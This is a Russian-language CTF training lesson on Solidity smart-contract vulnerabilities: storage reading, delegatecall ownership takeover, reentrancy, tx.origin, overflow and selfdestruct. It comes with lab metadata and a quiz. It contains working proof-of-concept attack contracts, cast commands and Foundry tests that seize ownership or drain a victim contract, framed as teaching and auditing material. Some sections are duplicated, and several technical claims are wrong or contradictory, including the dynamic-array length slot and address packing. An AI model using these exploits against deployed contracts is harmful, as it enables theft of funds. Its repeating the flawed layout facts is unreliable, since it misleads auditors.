---
id: misc-blockchain-solidity
title: "Solidity: уязвимости смарт-контрактов"
category: misc
parent: misc-blockchain
difficulty: hard
order: 1
tags: [solidity, evm, smart-contract, overflow, delegatecall, tx-origin, ctf]
prerequisites: [misc-blockchain]
useful_for:
  - "CTF Blockchain категория"
  - "Аудит смарт-контрактов"
  - "Bug bounty Web3"
estimated_minutes: 35
summary: "Модель EVM, типы и видимость в Solidity, integer overflow, delegatecall, tx.origin, selfdestruct и контроль доступа — с полными примерами и PoC."
lab:
  kind: shell
  title: 'Практика: аудит Solidity-контракта'
  toolset: [core, grep]
  workdir: /home/student/task
  files: [task.md, Vault.sol]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - '`Vault.sol` — контракт-хранилище. Ищи классические баги: `tx.origin`, overflow, unchecked call.'
    - 'Проверь модификаторы доступа у функций с `onlyOwner`.'
    - 'Секрет зашит в контракте — найди `nto{` и запиши в `found.txt`.'
---

## Вопрос, с которого всё начинается

В CTF-задаче по блокчейну почти всегда одна формулировка: «дан контракт — переведи его баланс на себя» или «сделай так, чтобы `isSolved()` вернул true». У тебя есть адрес, исходник контракта и RPC. С чего начать? Этот урок — практический минимум по уязвимостям Solidity: разберём один контракт и на нём увидим, как читать «приватные» данные и как захватить владение через `delegatecall`.

## Наш пример: контракт, где надо стать owner

Дано:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Proxy {
    address public implementation; // слот 0
    address public owner;          // слот 1
    constructor(address impl) {
        implementation = impl;
        owner = msg.sender;
    }
    fallback() external payable {
        (bool ok, ) = implementation.delegatecall(msg.data);
        require(ok);
    }
}
```

`Solidity` — язык смарт-контрактов Ethereum; `контракт` — это аккаунт с кодом и балансом. `Proxy` хранит адрес `implementation` и `owner`. Цель: стать `owner`. Чтобы понять, как, разберёмся, где вообще лежат эти переменные.

## Storage: где лежат данные

У каждого контракта есть **storage** — постоянное хранилище из 256-битных слотов, пронумерованных с нуля. Переменные раскладываются по слотам **по порядку объявления**: `implementation` попадёт в слот 0, `owner` — в слот 1. Это ключевой факт: адрес переменной в storage — не «секрет», а следствие порядка.

Модификатор `public` у переменной создаёт авто-геттер — функцию, которую можно вызвать извне. `private` убирает геттер, но **не** делает данные недоступными: блокчейн публичен, и любой может прочитать слот напрямую. Это первое, что делают в CTF.

## private не значит приватный: читаем слоты

Проверяем слоты контракта через `cast` (CLI-инструмент Foundry для запросов к блокчейну):

```bash
$ cast storage 0xPROXY 0 --rpc-url $RPC
0x0000000000000000000000001234...   # implementation
$ cast storage 0xPROXY 1 --rpc-url $RPC
0x000000000000000000000000dead...   # owner
```

Мы прочитали «приватную» раскладку, ничего не взламывая. Запомни: секретов в storage нет — есть только данные, которые лениво читать вручную.

## Как читать mapping и массивы

Со скалярами просто, но у `mapping` (словарь `ключ → значение`) и динамических массивов раскладка хитрее. `mapping` не хранит данные в своём слоте — слот лишь «база», а значение лежит по адресу `keccak256(key . slot)`. Динамический массив — по `keccak256(slot)`. Поэтому «прочитать» mapping вручную сложнее: нужно посчитать хеш ключа и слота. Компилятор также **упаковывает** несколько маленьких переменных в один слот, что важно при ручном чтении. Точную раскладку всегда печатает `solc --storage-layout`, а проверить — `cast storage`.

## delegatecall: выполняем чужой код в своём storage

Теперь ключ к задаче. `delegatecall` — это вызов, при котором код берётся из другого контракта, но исполняется **в контексте вызывающего**: storage, `msg.sender` и `msg.value` — от `Proxy`. В `fallback` (функция, срабатывающая при неизвестном вызове) `Proxy` делает `implementation.delegatecall(msg.data)`. Значит, любой вызов, который мы отправим `Proxy`, выполнится как код `implementation`, но запишет в storage **Proxy**.

Если `implementation` указывает на контракт с функцией `pwn`, которая пишет в слот 1, мы перезапишем `owner`:

```solidity
contract Attack {
    function pwn() external {
        assembly { sstore(1, caller()) } // слот 1 = msg.sender
    }
}
```

`sstore(1, caller())` — низкоуровневая инструкция EVM «записать в слот 1 значение вызывающего». `assembly` — вставка байткода напрямую, в обход проверок компилятора.

## Захватываем владение (PoC)

Отправляем вызов `pwn()` на адрес `Proxy` и проверяем результат:

```bash
$ cast send 0xPROXY "pwn()" --private-key $PK --rpc-url $RPC
$ cast call 0xPROXY "owner()(address)"
0x...наш_адрес
```

Мы стали владельцем: `delegatecall` исполнил `pwn` в storage `Proxy`, записав наш адрес в слот 1 (`owner`). В Foundry то же самое оформляют тестом:

```solidity
function testTakeover() public {
    address(proxy).call(abi.encodeWithSignature("pwn()"));
    assertEq(Proxy(proxy).owner(), address(this));
}
```

Ключ — понимать **раскладку storage**: `owner` в слоте 1. Поменялся бы порядок объявления — поменялся бы и слот.

## Соседние грабли: overflow, tx.origin, selfdestruct

Те же принципы лежат в основе других классических багов.

**Integer overflow/underflow.** До Solidity 0.8.0 арифметика не проверялась: `uint8(0) - 1` давало `255`. В 0.8+ компилятор вставляет проверки и вызывает `revert`, но блок `unchecked { … }` их отключает. Тогда при `amount > balance` вычитание даёт гигантское число, и следующий вывод проходит:

```solidity
unchecked { balances[msg.sender] -= amount; } // если amount > balance → огромное число
```

**tx.origin как авторизация.** `msg.sender` — тот, кто вызвал контракт непосредственно; `tx.origin` — внешний инициатор всей цепочки. Проверка `require(tx.origin == owner)` — ловушка: если владелец вызовет атакующий контракт, тот внутри дёрнет функцию, и `tx.origin` будет адресом владельца. Правильно — `require(msg.sender == owner)`.

**selfdestruct.** Уничтожает контракт и отправляет весь баланс указанному адресу. Им можно принудительно «накачать» контракт эфиром, сломав логику вида `address(this).balance == 0`.

## Каталог уязвимостей и версии компилятора

Соберём типовые баги в одну таблицу — это шпаргалка, к которой возвращаются при аудите:

| Уязвимость | Суть | Защита |
|-----------|------|--------|
| Integer overflow | Арифметика выходит за диапазон | Solidity ≥0.8, `SafeMath`, осторожный `unchecked` |
| Reentrancy | Внешний вызов до обновления состояния | checks-effects-interactions, reentrancy guard |
| delegatecall | Чужой код в своём storage | Неподменяемый адрес реализации |
| tx.origin | Авторизация по внешнему адресу | Использовать `msg.sender` |
| Access control | Нет/слабая проверка прав | `onlyOwner`, `initializer`, роли |
| Weak randomness | `block.timestamp`/`blockhash` как случайность | Commit-reveal, VRF |

Важно и то, что уязвимости зависят от **версии компилятора** (`pragma`). До 0.8.0 нет проверок переполнения — нужен `SafeMath`. В upgradable-контрактах без модификатора `initializer` функцию инициализации можно вызвать повторно и захватить владение. А inline `assembly` обходит проверки компилятора и часто содержит баги при работе со слотами. При аудите всегда смотрите `pragma` и наличие `assembly` — там прячутся самые неожиданные ошибки.

## Что мы теперь знаем

- Storage — слоты по 256 бит, переменные раскладываются **по порядку объявления**.
- `private` убирает только геттер; данные всё равно читаются через `cast storage`.
- `delegatecall` исполняет чужой код **в storage вызывающего** — так подменяют `owner`.
- `unchecked` отключает проверки переполнения; `tx.origin` — плохая авторизация.
- `selfdestruct` умеет принудительно перевести эфир на контракт.

## Reentrancy: полный PoC

Хотя в нашем примере был `delegatecall`, самый знаменитый баг Solidity — **reentrancy**. Контракт отправляет эфир внешним вызовом **до** обновления баланса; атакующий контракт в своём `receive()` рекурсивно вызывает снятие снова, пока баланс не опустеет:

```solidity
contract Victim {
    mapping(address => uint) public bal;
    function withdraw() external {
        uint a = bal[msg.sender];
        (bool ok, ) = msg.sender.call{value: a}("");   // внешний вызов
        require(ok);
        bal[msg.sender] = 0;                            // слишком поздно
    }
}

contract Attack {
    Victim v;
    receive() external payable { if (address(v).balance > 0) v.withdraw(); }
}
```

Лечится паттерном **checks-effects-interactions** (сначала обнулить баланс, потом переводить) или reentrancy guard (`nonReentrant`).

## Foundry-тест: как воспроизвести атаку

Локально атаку удобно оформить тестом Foundry — так её видно и можно отлаживать:

```solidity
function testReentrancy() public {
    vm.deal(address(victim), 10 ether);
    vm.prank(alice);
    victim.deposit{value: 1 ether}();
    vm.prank(alice);
    attack.attack{value: 1 ether}();
    assertEq(address(victim).balance, 0);
}
```

`vm.deal`, `vm.prank` и `assertEq` — стандартные читы Foundry: дать баланс, подменить `msg.sender` и проверить результат. Так любой баг превращается в воспроизводимый PoC.

## Таблица инструментов аудита

| Инструмент | Назначение |
|---|---|
| `slither` | статический анализ, поиск известных багов |
| `mythril` | символьное исполнение, поиск путей к уязвимости |
| `foundry` | PoC-тесты и фаззинг контрактов |
| `echidna` | property-based фаззинг |
| `cast` | чтение storage, отправка транзакций |
| Ethernaut / Damn Vulnerable DeFi | обучающие задачи |

Порядок работы: сначала `slither` для быстрой разведки, потом ручной разбор storage и прав, затем `foundry`-PoC для подтверждения. Автоматика находит шаблонные баги, но `delegatecall` и логику обычно видно только глазами.

## ABI, селекторы и как устроен вызов

Любой вызов контракта — это `calldata`: 4 байта селектора (первые 4 байта `keccak256("func(uint256)")`) и упакованные аргументы по 32 байта каждый. Понимание ABI критично: именно из calldata атакующий собирает произвольные вызовы. Инструменты вроде `cast` (Foundry) и `web3.py` дают `encode_call`/`decode_call`.

```bash
# селектор функции
cast sig "transfer(address,uint256)"
# ручной вызов без ABI
cast call $TARGET "0x$(cast sig 'owner()')"
```

Если контракт не верифицирован, селекторы всё равно читаются: `functionSelectors` в байткоде ищут по `PUSH4`. Это позволяет восстановить сигнатуры публичных методов по открытой базе `4byte.directory`.

## Storage layout: точный расчёт слотов

Solidity упаковывает переменные по 32 байта. Правила:

- Простые типы (`uint256`, `address`) занимают **целый слот** каждый.
- Мелкие типы (`uint8`, `bool`, `address`) **упаковываются** в один слот, если помещаются.
- Массивы и mapping занимают **один слот** под «метаданные», а элементы лежат по вычисляемому адресу.

Для dynamic array `a` длина — `keccak256(slot_a)`, элемент `i` — `keccak256(slot_a) + i`. Для `mapping(k => v)` по слоту `s` значение ключа `k` — `keccak256(abi.encode(k, s))`. Именно поэтому «приватные» данные читаются: слот можно вычислить, а `eth_getStorageAt` доступен любому.

```python
from web3 import Web3
slot = Web3.keccak(hexstr=(key.to_bytes(32,'big').hex() + slot_hex))
val = w3.eth.get_storage_at(addr, int.from_bytes(slot,'big'))
```

## delegatecall: граница доверия

`delegatecall` исполняет код **другого** контракта в контексте текущего: `storage`, `msg.sender`, `address` остаются от вызывающего. Это основа прокси-паттернов и одновременно класс уязвимостей:

- **Storage collision** в прокси: если реализация и прокси используют разные layout'ы, вызов перезапишет не те слоты (например, `owner` в прокси окажется `implementation`-слотом).
- **Unprotected initializer**: у прокси `initialize()` может не иметь защиты, и атакующий вызывает её напрямую, становясь владельцем.
- **Arbitrary delegatecall**: если функция делает `delegatecall` на адрес из calldata без проверки, атакующий подсовывает свой контракт и исполняет произвольный код в storage жертвы.

Проверка: `cast storage $PROXY 0` — посмотрите слот 0; в OpenZeppelin-прокси это `_implementation`, а `owner` лежит дальше. Знание layout — половина атаки.

## Каталог уязвимостей и версии компилятора

Версия компилятора определяет доступные баги. Ключевые вехи:

| Версия | Уязвимость | Как эксплуатируется |
|---|---|---|
| <0.8.0 | integer overflow/underflow | арифметика без проверок |
| <0.4.22 | constructor() как public-функция | любой становится owner |
| <0.5.0 | uninitialized storage pointer | запись в чужой слот |
| все | `tx.origin` вместо `msg.sender` | фишинг через промежуточный контракт |
| все | reentrancy | внешний вызов до обновления состояния |
| все | `selfdestruct` force-send ETH | ломает `address(this).balance` |

`pragma solidity ^0.6.0` сразу подсказывает: overflow возможен, нужна `SafeMath` или ручная проверка. Если видите `function() public payable` как конструктор — это древний контракт, и атака тривиальна.

## Восстановление после selfdestruct и reentrancy

**Reentrancy** (классика The DAO): функция переводит ETH до обнуления баланса, получатель — контракт с fallback, который рекурсивно вызывает функцию снова. Лечится паттерном checks-effects-interactions и `nonReentrant`. Атакующий контракт:

```solidity
function attack() external payable { victim.withdraw(); }
receive() external payable { if (address(victim).balance >= 1 ether) victim.withdraw(); }
```

**selfdestruct force-send**: `selfdestruct` отправляет ETH принудительно, даже если у получателя `receive()` ревертит. Это ломает инварианты `require(address(this).balance == total)`, которыми проверяются «честные» депозиты. Учитывайте при аудите логики ставок.

## Чек-лист аудита контракта

1. Версия компилятора → известные баги.
2. Storage layout: где `owner`, есть ли прокси и совпадает ли layout.
3. Внешние вызовы: порядок «изменение состояния → внешний вызов»?
4. `delegatecall`/`call`: защищён ли адрес и селектор.
5. Модификаторы доступа на всех чувствительных функциях.
6. `tx.origin` в авторизации.
7. Арифметика и `SafeMath` для `<0.8.0`.
8. Проверяемость инвариантов: не ломается ли `balance` через force-send.

## Частые ошибки аудита

- **Смотреть только код, а не раскладку storage** — порядок объявления переменных определяет слоты, и баг часто именно в этом.
- **Игнорировать `pragma`** — до 0.8.0 нет проверок переполнения, нужен `SafeMath`.
- **Забыть про `unchecked` и `assembly`** — там отключены проверки компилятора.
- **Не проверить права функций** — отсутствие `onlyOwner`/`initializer` означает захват владения.
- **Пропустить `delegatecall`** — подменяемый адрес реализации даёт исполнение чужого кода в своём storage.

## Квиз

Проверь себя.

```quiz
- question: "Что означает модификатор `private` для переменной Solidity?"
  options:
    - "Нет авто-геттера, но значение видно в storage"
    - "Переменную нельзя прочитать никому, включая через RPC"
    - "Переменная хранится в calldata"
    - "Она доступна только конструктору"
  answer: 0
  explanation: "Все данные блокчейна публичны; private лишь убирает геттер."
- question: "Почему delegatecall в прокси опасен при подменяемом адресе реализации?"
  options:
    - "Чужой код исполняется в storage вызывающего и может перезаписать owner"
    - "Он всегда дороже обычного call"
    - "Он не поддерживает payable"
    - "Он блокирует слот 0"
  answer: 0
  explanation: "Контекст (storage/msg.sender) остаётся от прокси."
- question: "Какое условие авторизации корректно?"
  options:
    - "require(msg.sender == owner)"
    - "require(tx.origin == owner)"
    - "require(block.coinbase == owner)"
    - "require(gasleft() > 0)"
  answer: 0
  explanation: "msg.sender — непосредственный вызывающий, его нельзя подделать через промежуточный контракт."
- question: "Когда integer underflow в Solidity 0.8+ возможен?"
  options:
    - "Внутри блока unchecked или при сужении типа"
    - "Всегда"
    - "Только в view-функциях"
    - "Никогда"
  answer: 0
  explanation: "0.8 вставляет проверки, но unchecked их отключает."
- question: "Что делает selfdestruct?"
  options:
    - "Отправляет весь баланс контракта указанному адресу и удаляет код"
    - "Удаляет storage всех пользователей"
    - "Паузит контракт"
    - "Меняет owner"
  answer: 0
  explanation: "Это способ и уничтожить контракт, и принудительно перевести эфир."
```

## Куда дальше

В следующем уроке `misc-blockchain-tools` мы поднимем локальную ноду и научимся воспроизводить такие атаки в Foundry. А пока главное: в Solidity уязвимость почти всегда — это неверное представление о том, **где лежат данные и кто их контролирует**. Возьми Ethernaut и пройди первые уровни локально, читая storage через `cast storage`.

## Где пригодится

- **CTF:** категория Blockchain — от чтения контракта до PoC-эксплойта.
- **Аудит:** реальный аудит Solidity-проектов, отчёты.
- **Bug bounty:** Immunefi и Web3-программы.
- **Работа:** безопасность DeFi, разбор инцидентов.
